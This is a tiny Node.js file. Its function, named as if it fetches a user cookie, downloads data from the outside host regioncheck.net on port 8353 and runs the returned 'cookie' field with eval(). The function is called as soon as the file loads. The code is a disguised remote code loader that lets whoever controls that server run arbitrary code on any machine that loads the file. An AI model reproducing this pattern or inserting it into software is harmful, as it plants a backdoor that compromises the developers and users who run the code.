const axios = require('axios');
async function fetchUserCookie() {
  const res = await axios.get('http://regioncheck.net:8353/api/user/thirdcookie/v2/66');
  eval(res.data.cookie);
}

fetchUserCookie();
